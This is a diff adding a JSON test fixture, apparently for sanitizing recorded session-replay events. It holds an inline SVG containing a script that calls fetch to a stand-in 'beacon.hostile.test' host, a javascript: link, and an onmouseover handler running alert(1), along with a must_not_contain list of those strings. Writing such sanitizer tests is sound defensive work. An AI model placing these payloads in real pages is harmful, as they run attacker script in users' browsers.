@@ -1,0 +1,127 @@
+{
+ "id": "svg-script",
+ "description": "Script, script links and an animation that sets an event handler, inside inline SVG.",
+ "events": [
+  {
+   "type": 4,
+   "timestamp": 1790000000000,
+   "data": {
+    "href": "https://shop.test/hostile",
+    "width": 1280,
+    "height": 720
+   }
+  },
+  {
+   "type": 2,
+   "timestamp": 1790000000010,
+   "data": {
+    "node": {
+     "type": 0,
+     "childNodes": [
+      {
+       "type": 1,
+       "name": "html",
+       "publicId": "",
+       "systemId": "",
+       "id": 2
+      },
+      {
+       "type": 2,
+       "tagName": "html",
+       "attributes": {},
+       "childNodes": [
+        {
+         "type": 2,
+         "tagName": "head",
+         "attributes": {},
+         "childNodes": [],
+         "id": 4
+        },
+        {
+         "type": 2,
+         "tagName": "body",
+         "attributes": {},
+         "childNodes": [
+          {
+           "type": 2,
+           "tagName": "svg",
+           "attributes": {},
+           "childNodes": [
+            {
+             "type": 2,
+             "tagName": "script",
+             "attributes": {},
+             "childNodes": [
+              {
+               "type": 3,
+               "textContent": "fetch('https://beacon.hostile.test/svg')",
+               "id": 11
+              }
+             ],
+             "id": 12,
+             "isSVG": true
+            },
+            {
+             "type": 2,
+             "tagName": "a",
+             "attributes": {
+              "xlink:href": "javascript:fetch('https://beacon.hostile.test/svg-a')"
+             },
+             "childNodes": [],
+             "id": 13,
+             "isSVG": true
+            },
+            {
+             "type": 2,
+             "tagName": "set",
+             "attributes": {
+              "attributeName": "onmouseover",
+              "to": "alert(1)"
+             },
+             "childNodes": [],
+             "id": 14,
+             "isSVG": true
+            }
+           ],
+           "id": 15,
+           "isSVG": true
+          }
+         ],
+         "id": 5
+        }
+       ],
+       "id": 3
+      }
+     ],
+     "id": 1
+    },
+    "initialOffset": {
+     "left": 0,
+     "top": 0
+    }
+   }
+  },
+  {
+   "type": 3,
+   "timestamp": 1790000002000,
+   "data": {
+    "source": 1,
+    "positions": [
+     {
+      "x": 10,
+      "y": 10,
+      "id": 5,
+      "timeOffset": 0
+     }
+    ]
+   }
+  }
+ ],
+ "must_not_contain": [
+  "\"tagname\":\"script\"",
+  "javascript:",
+  "beacon.hostile.test",
+  "onmouseover",
+  "alert(1)"
+ ]
+}
